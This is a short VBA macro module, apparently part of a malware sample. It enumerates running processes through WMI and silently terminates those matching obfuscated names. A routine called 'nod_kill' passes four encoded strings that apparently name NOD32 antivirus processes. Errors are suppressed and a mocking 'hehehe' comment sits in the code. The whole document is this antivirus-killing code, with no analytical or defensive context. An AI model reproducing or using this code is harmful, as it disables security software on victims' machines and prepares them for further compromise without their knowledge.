Attribute VB_Name = "Module3"


Public Sub KillProcess(ByVal processName As String)
On Error GoTo ErrHandler
Dim oWMI
Dim ret
Dim sService
Dim oWMIServices
Dim oWMIService
Dim oServices
Dim oService
Dim servicename
Set oWMI = GetObject(des("ƒuzysy€F"))
Set oServices = oWMI.InstancesOf(des("ƒuz?>k|~{oq"))
For Each oService In oServices
servicename = LCase(Trim(CStr(oService.Name) & "ƒuz?>k|~{oq"))
If InStr(1, servicename, LCase(processName), vbTextCompare) > 0 Then
ret = oService.Terminate
End If
Next
Set oServices = Nothing
Set oWMI = Nothing
ErrHandler:
Err.Clear
End Sub
Sub nod_kill()
'hehehe'
On Error Resume Next
KillProcess (des("z{p?>w~z:q„q"))
KillProcess (des("z{p?>wu:q„q"))
KillProcess (des("z{p?>:q„q"))
KillProcess (des("qsu:q„q"))
End Sub

